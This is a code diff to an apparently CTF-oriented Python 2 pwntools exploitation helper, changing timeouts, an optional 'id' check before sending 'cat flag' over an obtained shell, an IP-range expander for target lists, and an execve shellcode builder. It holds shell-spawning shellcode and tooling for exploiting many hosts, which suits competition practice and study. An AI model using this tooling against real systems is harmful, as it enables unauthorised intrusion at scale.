@@ -30,13 +30,14 @@ Notice:
             pass
         if self.REMOTE == 0:
             gdb.attach(self.r, breakpoint)
-        pause()
+        # pause()
 
     # 创建连接的主要函数
     def run(self,ip=None,port=None):
         if ip and port:
             self.REMOTE=1
             self.r=remote(ip,port)
+            # self.r=remote(ip,port,timeout=2)
         elif self.llibc and self.binary and self.ld:
             self.r=process([self.ld,self.binary],env={'LD_PRELOAD':self.llibc})            
         elif self.llibc and self.binary:
@@ -65,13 +66,14 @@ Notice:
         self.r.sendafter(x,y)
     def close(self):
         self.r.close()
-    def getflag(self,getshell=True):
+    def getflag(self,getshell=True,check_id=True):
         if getshell:
-            self.sl("id")
-            if "uid" not in self.r.recvuntil("uid",drop=False,timeout=1):
-                log.error("All ready get shell?")
-                return
-            self.rl()
+            if check_id:
+                self.sl("id")
+                if "uid" not in self.r.recvuntil("uid",drop=False,timeout=1):
+                    log.error("All ready get shell?")
+                    return
+                self.rl()
             self.sl("cat flag")
             flag=self.rl()[:-1]
             return flag
@@ -97,7 +99,7 @@ Notice:
         except:
             self.libc=self.elf.libc
 
-    def __init__(self,binary,llibc=None,ld=None,aslr=True):
+    def __init__(self,binary,llibc=None,ld=None,aslr=True,timeout=None):
         self.r=None
         self.elf=None
         self.libc=None
@@ -111,6 +113,9 @@ Notice:
 
         self.stack=0
         self.heapbase=0
+
+        if timeout:
+            context.timeout=timeout
 
         try:
             self.elf=ELF(self.binary)
@@ -144,28 +149,36 @@ class SUBMIT:
             print "--------------------- END ---------------------\n"
 
 class IPLIST:
-    # IPLIST('127.0.*.*').result --> List
+    # IPLIST('125-127.100-110.110-120.20-25').result --> List
+
     def __init__(self,ip):
         self.result=[]
-        self.result.append(ip)
-        self.iplist()
-    def iplist(self):
-        """
-        ip: '111.111.111.*'
-        """
-        for i in self.result:
-            tmp=i.split('.')
-            if '*' in tmp:
-                self.result.remove(i)
-                idx=tmp.index('*')
-                for j in range(256):
-                    tmp1=tmp
-                    tmp1[idx]=str(j)
-                    self.result.append(".".join(tmp1))
-                self.iplist() 
-                return
+        def iplist(ip_range):
+            # ip_range: '125-127.100-110.110-120.20-25'
+            tmp=ip_range.split('.')
+            tmp_list=[]
+            result=[]
+            for i in tmp:
+                if '-' in i:
+                    tmp1=i.split('-')
+                    if len(tmp1) == 2:
+                        tmp_list.append((int(tmp1[0]),int(tmp1[1]),1))
+                    elif len(tmp1)==3:
+                        tmp_list.append((int(tmp1[0]),int(tmp1[1]),int(tmp1[2])))
+                    else:
+                        print("[-] Error ip_range!")
+                        exit()
+                else:
+                    tmp_list.append((int(i),int(i)+1,1))
+            for a in range(tmp_list[0][0],tmp_list[0][1],tmp_list[0][2]):
+                for b in range(tmp_list[1][0],tmp_list[1][1],tmp_list[1][2]):
+                    for c in range(tmp_list[2][0],tmp_list[2][1],tmp_list[2][2]):
+                        for d in range(tmp_list[3][0],tmp_list[3][1],tmp_list[3][2]):
+                            tmpip=".".join([str(a),str(b),str(c),str(d)])
+                            result.append(tmpip)
+            return result
+        self.result=iplist(ip)
 
-                        
 def pack_file32(
         _flags = 0,
         _IO_read_ptr = 0,
@@ -360,8 +373,7 @@ def gadget2(addr):
     # rcx为返回地址, rdi为可控指针
     return p64(addr+0x47b75)
 
-def execve(is32=False,multi=0):
-    
+def execve(is32=False,multi_arch=0):
     multi="""
     xor esi, esi                  
     mul esi                       
@@ -381,7 +393,7 @@ def execve(is32=False,multi=0):
     mov al, 0xb                     
     int 0x80      
     """
-    if multi:
+    if multi_arch:
         return asm(multi,arch="amd64")
     # 20byte         
     code32="""
